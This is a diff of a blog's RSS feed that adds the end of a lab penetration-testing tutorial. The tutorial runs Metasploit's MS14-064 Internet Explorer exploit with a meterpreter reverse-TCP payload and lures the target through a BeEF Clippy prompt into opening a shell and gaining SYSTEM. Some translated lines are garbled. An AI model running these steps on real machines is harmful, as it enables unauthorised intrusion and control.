@@ -1,8 +1,8 @@
 <rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
     <channel>
-        <title>metasploit - Tag - WeepingDogel</title>
+        <title>Metasploit - Tag - WeepingDogel</title>
         <link>http://weepingdogel.github.io/tags/metasploit/</link>
-        <description>metasploit - Tag - WeepingDogel</description>
+        <description>Metasploit - Tag - WeepingDogel</description>
         <generator>Hugo -- gohugo.io</generator><language>en</language><managingEditor>weepingdogel@gmail.com (WeepingDogel)</managingEditor>
             <webMaster>weepingdogel@gmail.com (WeepingDogel)</webMaster><lastBuildDate>Tue, 02 Feb 2021 13:43:23 &#43;0800</lastBuildDate><atom:link href="http://weepingdogel.github.io/tags/metasploit/" rel="self" type="application/rss+xml" /><item>
     <title>LAN Penetration Testing with Beef, Bettercap, and Other Tools</title>
@@ -222,7 +222,207 @@ Later, we will write it into an attack script~</li>
 <p>Then we&rsquo;ll have the target machine open a browser and visit a website&hellip;</p>
 <p>Since IE8 no longer supports HTTPS for Bing, it will be vulnerable as soon as it opens.</p>
 <p></p>
-<p></p>]]></description>
+<p></p>
+<p>And then there&rsquo;s so much we can do.</p>
+<p></p>
+<p>I decided to use a clippy module that binds to a <code>ms14-064</code> address, and now it&rsquo;s msf&rsquo;s turn.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfconsole
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p></p>
+<p>Enable Modules.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">&gt; use exploit/windows/browser/ms14_064_ole_code_execution
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">&gt; info 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s see the description.</p>
+<blockquote>
+<p>Description:</p>
+<p>This module exploits the Windows OLE Automation array vulnerability,
+CVE-2014-6332. The vulnerability is known to affect Internet
+Explorer 3.0 until version 11 within Windows 95 up to Windows 10,
+and no patch for Windows XP. However, this exploit will only target
+Windows XP and Windows 7 box due to the Powershell limitation.
+Windows XP by defaults supports VBS, therefore it is used as the
+attack vector. On other newer Windows systems, the exploit will try
+using Powershell instead.</p>
+</blockquote>
+<p>Check the options</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">show options
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Module options (exploit/windows/browser/ms14_064_ole_code_execution):
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name                   Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----                   ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">   AllowPowershellPrompt  false            yes       Allow exploit to try Powershell
+</span></span><span class="line"><span class="cl">   Retries                true             no        Allow the browser to retry the module
+</span></span><span class="line"><span class="cl">   SRVHOST                0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+</span></span><span class="line"><span class="cl">   SRVPORT                8080             yes       The local port to listen on.
+</span></span><span class="line"><span class="cl">   SSL                    false            no        Negotiate SSL for incoming connections
+</span></span><span class="line"><span class="cl">   SSLCert                                 no        Path to a custom SSL certificate (default is randomly generated)
+</span></span><span class="line"><span class="cl">   TRYUAC                 false            yes       Ask victim to start as Administrator
+</span></span><span class="line"><span class="cl">   URIPATH                                 no        The URI to use for this exploit (default is random)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Payload options (windows/meterpreter/reverse_tcp):
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name      Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----      ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+</span></span><span class="line"><span class="cl">   LHOST     192.168.101.15   yes       The listen address (an interface may be specified)
+</span></span><span class="line"><span class="cl">   LPORT     4444             yes       The listen port
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Exploit target:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Id  Name
+</span></span><span class="line"><span class="cl">   --  ----
+</span></span><span class="line"><span class="cl">   0   Windows XP
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Normally we would just set a <code>SRVHOST</code>, but <code>bettercap</code> just took port <code>8080</code>, so we need to set a new <code>SRVPORT</code>.</p>
+<p>The <code>SRVHOST</code> is set to the address of the attacking machine.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set SRVHOST 192.168.101.15
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>SRVPORT</code> Arbitrarily specify a free port</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set SRVPORT 9999
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Execute.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">exploit
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then we get it</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[*] Exploit running as background job 0.
+</span></span><span class="line"><span class="cl">[*] Exploit completed, but no session was created.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Started reverse TCP handler on 192.168.101.15:4444 
+</span></span><span class="line"><span class="cl">[*] Using URL: http://192.168.101.15:9999/deCFhCIwXNHYT
+</span></span><span class="line"><span class="cl">[*] Server started.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Change the default <code>Clippy image directory</code> address to the attacker&rsquo;s address, then put the link <code>http://192.168.101.15:9999/deCFhCIwXNHYT</code> in the <code>Executable</code> field.</p>
+<p></p>
+<p>Then click the <code>execute</code>.</p>
+<p>That&rsquo;s when a funny thing happens to the target machine.</p>
+<p></p>
+<p>Whichever one you click on, it jumps to the msf link.
+After clicking on it, msf responds.</p>
+<p></p>
+<p>A <code>meterpreter</code> connection is established.</p>
+<p></p>
+<p>Get in the session.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">sessions -i 1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p></p>
+<p>At this point we can use <code>meterpreter</code> to operate the target machine as normal&hellip;</p>
+<p></p>
+<p>The <code>getsystem</code> lifting is also no problem.</p>
+<p>As for the use of <code>meterpreter</code>, I will not continue to write about it, because I have written about it before (escape.).</p>
+<p>Then here is half of the success, the rest is the post-penetration, say a long time can not finish it ~ ~ here it is ~</p>
+<h2 id="end">End</h2>
+<p>I&rsquo;m sorry, but I&rsquo;m not sure if I&rsquo;m going to be able to do this. qwq
+However, to declare that the content of this article is limited to the test to learn to use, <strong>do not take to do bad things</strong>, or the consequences of their own Oh ~</p>
+<p>Finally, this site follows the [CC-BY-NC 4.0 protocol] (<a href="https://creativecommons.org/licenses/by-nc/4.0/%29" target="_blank" rel="noopener noreffer ">https://creativecommons.org/licenses/by-nc/4.0/)</a>, reproduced please specify the source!</p>
+<h2 id="reference-links">Reference links</h2>
+<ul>
+<li><a href="https://cvedetails.com/cve/CVE-2014-6332/" target="_blank" rel="noopener noreffer ">CVE-2014-6332 : OleAut32.dll in OLE in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows</a></li>
+<li><a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/MS14-064" target="_blank" rel="noopener noreffer ">Microsoft Security Bulletin MS14-064 - Critical | Microsoft Docs</a></li>
+<li><a href="https://www.exploit-db.com/exploits/35229" target="_blank" rel="noopener noreffer ">Microsoft Internet Explorer 11 - OLE Automation Array Remote Code Execution (1) - Windows remote Exploit</a></li>
+<li><a href="https://www.exploit-db.com/exploits/35308" target="_blank" rel="noopener noreffer ">Microsoft Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / PowerShell VirtualAlloc (MS14-064) - Windows remote Exploit</a></li>
+<li><a href="http://securityintelligence.com/ibm-x-force-researcher-finds-significant-vulnerability-in-microsoft-windows" target="_blank" rel="noopener noreffer ">IBM X-Force Researcher Finds Significant Vulnerability in Microsoft Windows</a></li>
+<li><a href="https://forsec.nl/2014/11/cve-2014-6332-internet-explorer-msf-module" target="_blank" rel="noopener noreffer ">CVE-2014-6332: it’s raining shells | forsec</a></li>
+<li><a href="https://usstzt.site/2020/05/26/bettercap%E7%9A%84%E4%BD%BF%E7%94%A8/#&amp;gid=1&amp;pid=2" target="_blank" rel="noopener noreffer ">kali bettercap的使用 | UsstZt</a></li>
+<li><a href="https://blog.csdn.net/qq_33066259/article/details/80737308" target="_blank" rel="noopener noreffer ">Bettercap2.6与beef的使用_请你吃橘子-CSDN博客</a></li>
+<li><a href="https://www.deepl.com/translator#en/zh/This%20module%20exploits%20the%20Windows%20OLE%20Automation%20array%20vulnerability%2C%20CVE-2014-6332.%20The%20vulnerability%20is%20known%20to%20affect%20Internet%20Explorer%203.0%20until%20version%2011%20within%20Windows%2095%20up%20to%20Windows%2010%2C%20and%20no%20patch%20for%20Windows%20XP.%20However%2C%20this%20exploit%20will%20only%20target%20Windows%20XP%20and%20Windows%207%20box%20due%20to%20the%20Powershell%20limitation.%20Windows%20XP%20by%20defaults%20supports%20VBS%2C%20therefore%20it%20is%20used%20as%20the%20attack%20vector.%20On%20other%20newer%20Windows%20systems%2C%20the%20exploit%20will%20try%20using%20Powershell%20instead." target="_blank" rel="noopener noreffer ">DeepL Translate</a></li>
+</ul>]]></description>
 </item>
 </channel>
 </rss>
